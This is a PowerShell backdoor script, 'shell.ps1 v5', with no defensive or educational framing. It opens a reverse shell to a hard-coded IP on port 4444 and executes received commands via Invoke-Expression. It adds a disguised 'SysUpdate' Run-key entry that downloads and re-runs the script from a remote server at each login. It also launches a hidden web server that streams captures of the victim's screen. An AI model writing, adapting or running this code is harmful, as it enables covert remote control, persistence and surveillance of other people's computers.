# shell.ps1 v5 - FULL PATH + WORKING WEBSERVER
$a = "System.Net.Sockets."; $b = "TCPClient"; $c = New-Object ($a + $b)("192.168.1.15", 4444); $s = $c.GetStream(); [byte[]]$b_arr = 0..65535|%{0}; 
$currentPath = (Get-Location).Path; $m = ([text.encoding]::ASCII).GetBytes("CONNECTED FROM: $currentPath`nPS $currentPath > "); 
$s.Write($m,0,$m.Length);

# Persistence
$regcmd = 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(`"http://192.168.11.67/shell.ps1`")"';
New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force -ErrorAction SilentlyContinue | Out-Null;
Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value $regcmd -Force -ErrorAction SilentlyContinue;

# FIXED WEBSERVER - Screen capture (works everywhere)
Start-Process powershell -WindowStyle Hidden -ArgumentList "-nop","-c","`$l=New-Object System.Net.HttpListener;`$l.Prefixes.Add('http://*:8080/');`$l.Start();`$page='`<h1>BACKDOOR ACTIVE`</h1>`<img src=/screen width=800>`<br>`<a href=/screen>Refresh Screen`</a>';while(`$l.IsListening){`$ctx=`$l.GetContext();if(`$ctx.Request.Url.AbsolutePath -eq '/screen'){Add-Type -AssemblyName System.Drawing,System.Windows.Forms;`$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;`$bmp=New-Object System.Drawing.Bitmap(`$b.Width,`$b.Height);`$g=[System.Drawing.Graphics]::FromImage(`$bmp);`$g.CopyFromScreen(`$b.Location,[System.Drawing.Point]::Empty,`$b.Size);`$ms=New-Object IO.MemoryStream;`$bmp.Save(`$ms,[System.Drawing.Imaging.ImageFormat]::Jpeg,80L);`$ctx.Response.ContentType='image/jpeg';`$ctx.Response.ContentLength64=`$ms.Length;`$ms.Position=0;`$ms.CopyTo(`$ctx.Response.OutputStream)}else{`$ctx.Response.ContentType='text/html';`$bytes=[Text.Encoding]::UTF8.GetBytes(`$page);`$ctx.Response.ContentLength64=`$bytes.Length;`$ctx.Response.OutputStream.Write(`$bytes,0,`$bytes.Length)};`$ctx.Response.Close()}"

# REVERSE SHELL WITH FULL PATH
while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
    $d = [text.encoding]::ASCII.GetString($b_arr,0, $i); 
    $sb = try { Invoke-Expression $d 2>&1 | Out-String } catch { $_.Exception.Message }; 
    $currentPath = (Get-Location).Path;
    $out = $sb + "PS $currentPath > "; 
    $m = ([text.encoding]::ASCII).GetBytes($out); 
    $s.Write($m,0,$m.Length); 
    $s.Flush()
}
$c.Close()
